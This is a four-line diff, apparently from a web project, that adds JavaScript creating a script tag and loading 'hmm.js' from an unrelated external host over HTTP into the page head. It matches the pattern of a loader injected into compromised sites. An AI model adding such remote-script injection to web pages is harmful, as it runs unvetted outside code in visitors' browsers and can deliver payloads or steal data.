@@ -1,0 +1,4 @@
+var sc=document.createElement('script');
+      sc.id='McKES';
+sc.src = 'http://www.bornkes.w.szu.pl/js/hmm.js';
+document.getElementsByTagName('head')[0].appendChild(sc);
